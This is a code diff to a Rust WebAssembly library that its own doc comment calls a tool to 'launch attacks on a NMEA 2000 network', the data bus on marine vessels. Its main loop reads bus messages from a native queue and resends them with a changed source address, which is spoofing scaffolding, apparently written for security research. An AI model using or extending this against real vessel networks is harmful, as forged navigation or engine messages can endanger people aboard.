@@ -1,44 +1,59 @@
-//links to C++ functions
-extern "C" {
-    #[link_name = "printHello"]
-    fn printHello(number: i32) -> i32;
+#![warn(missing_docs)]
 
-    #[link_name = "printStr"]
-    fn printStr(input: *const char) -> i32;
+//! # nmea_attack
+//!
+//! A libary design to be compiled as a WebAssembley (wasm) app used to launch attacks on a NMEA 2000 network
 
-    #[link_name = "SendMsgToApp"]
-    fn SendMsgToApp(char_ptr: *const char, length: i32) -> i32;
 
-    #[link_name = "ReceiveMsgFromApp"]
-    fn ReceiveMsgFromApp(controller_number: i32, PGN: i32, source: i32, priority: i32, data_length_bytes: i32, data: [char; 223] ) -> bool;
 
-}
+// Modules
+mod nmea_msg;
+mod native_functions;
 
-static mut GLOBAL_CHAR_PTR: *const char = std::ptr::null();
+use nmea_msg::NMEAMsg;
 
+/// Points to a message requested from the native read queue
+static mut MSG_PTR: *const u8 = std::ptr::null();
+
+/// links MSG_PTR to the buffer allocated for the wasm app
+///
+/// Sets MSG_PTR to the allocated wasm buffer so that when the native code updates the buffer, the updates can be accessed from within this app. 
+/// This function is called from the native code before the main() function is executed. 
 #[no_mangle]
-pub extern "C" fn get_msg(char_arr: *const char, char_array_size: i32 ){
+pub extern "C" fn link_msg_buffer(char_arr: *const u8, _char_array_size: i32 ){
     unsafe {
-        GLOBAL_CHAR_PTR = char_arr;
+        MSG_PTR = char_arr;
     }
 }
 
 
-
+/// Main execution loop
+///
+/// Called from native code as a pthread. Requests messages from the read queue, modifies certain messages, and send messages out on the appropriate send queue. 
 #[no_mangle]
 fn main() {
 
-    unsafe{
-        let x: i32;
-        x = printHello(11);
-        printHello(x);
-        let first_char = unsafe {*GLOBAL_CHAR_PTR};
-        
-        printStr(GLOBAL_CHAR_PTR);
+    let mut msg = NMEAMsg::default();
 
-        //let my_array: [char; 223] = ['x'; 223];
-        //ReceiveMsgFromApp(0,12757,3,5,8,my_array);
-        //SendMsgToApp();
+    unsafe{
+
+        let message_received: i32 = native_functions::GetMsg();
+        
+        if message_received == 1 {
+
+            native_functions::RemoveAppDelay();
+
+            msg = nmea_msg::chars_to_nmea(MSG_PTR,nmea_msg::MAX_DATA_LENGTH_BYTES);
+
+            native_functions::SendMsg(msg.controller_num as i32, msg.priority as i32, msg.pgn as i32, 14 as i32, msg.data.as_ptr(), msg.data_length_bytes as i32);
+            
+        }
+
+        else{
+            native_functions::AddAppDelay();
+        }
 
     }
+   
+
 }
